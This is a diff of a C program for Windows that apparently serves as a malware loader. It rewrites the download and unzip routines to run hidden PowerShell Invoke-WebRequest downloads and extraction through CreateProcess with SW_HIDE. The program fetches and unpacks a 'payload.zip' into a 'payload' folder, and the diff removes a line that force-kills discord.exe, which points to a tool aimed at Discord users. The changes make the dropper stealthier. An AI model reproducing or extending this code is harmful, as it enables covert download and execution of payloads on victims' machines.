@@ -1,7 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <curl/curl.h>
 #include <windows.h>
 #include <Lmcons.h>
 #include <io.h>
@@ -63,6 +62,13 @@ int moveFiles(const char *srcDir, const char *destDir) {
 }
 
 int unzipFile(const char *zipFilePath, const char *destinationFolder) {
+    STARTUPINFO si = {0};
+    si.cb = sizeof(STARTUPINFO);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi = {0};
+
     char command[1024];
     char unzipPath[MAX_PATH];
 
@@ -73,7 +79,23 @@ int unzipFile(const char *zipFilePath, const char *destinationFolder) {
     strcpy(unzipPath, destinationFolder);
     strcat(unzipPath, "/payload");
 
-    system(command);
+    CreateProcess(
+        NULL,        
+        command,
+        NULL, 
+        NULL,
+        FALSE,
+        0,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    );
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
 
     moveFiles(unzipPath, destinationFolder);
 
@@ -84,42 +106,46 @@ int unzipFile(const char *zipFilePath, const char *destinationFolder) {
 }
 
 int download(const char *url, const char *output_folder) {
-    CURL *curl;
-    FILE *fp;
-    CURLcode res;
-    char output_path[1024];
+    STARTUPINFO si = {0};
+    si.cb = sizeof(STARTUPINFO);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi = {0};
 
     const char *filename = strrchr(url, '/');
-    if (!filename) {
+    if (filename == NULL) {
         return 1;
     }
+
     filename++;
 
+    char output_path[1024];
     snprintf(output_path, sizeof(output_path), "%s/%s", output_folder, filename);
 
-    curl = curl_easy_init();
-    if (!curl) {
-        return 1;
-    }
+    char command[1024];
+    snprintf(command, sizeof(command), "powershell -Command \"Invoke-WebRequest -Uri \"%s\" -OutFile \"%s\" \"", url, output_path);
 
-    fp = fopen(output_path, "wb");
-    if (!fp) {
-        curl_easy_cleanup(curl);
-        return 1;
-    }
+    printf("%s\n", command);
 
-    curl_easy_setopt(curl, CURLOPT_URL, url);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+    CreateProcess(
+        NULL,        
+        command,
+        NULL, 
+        NULL,
+        FALSE,
+        0,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    );
 
-    res = curl_easy_perform(curl);
-    if (res != CURLE_OK) {
-        fclose(fp);
-        curl_easy_cleanup(curl);
-        return 1;
-    }
+    WaitForSingleObject(pi.hProcess, INFINITE);
 
-    fclose(fp);
-    curl_easy_cleanup(curl);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
     return 0;
 }
 
@@ -146,8 +172,6 @@ int main() {
     strcat(zip_folder, "/payload.zip");
 
     unzipFile(zip_folder, base_path);
-
-    system("taskkill /F /IM discord.exe");
 
     // code //
 
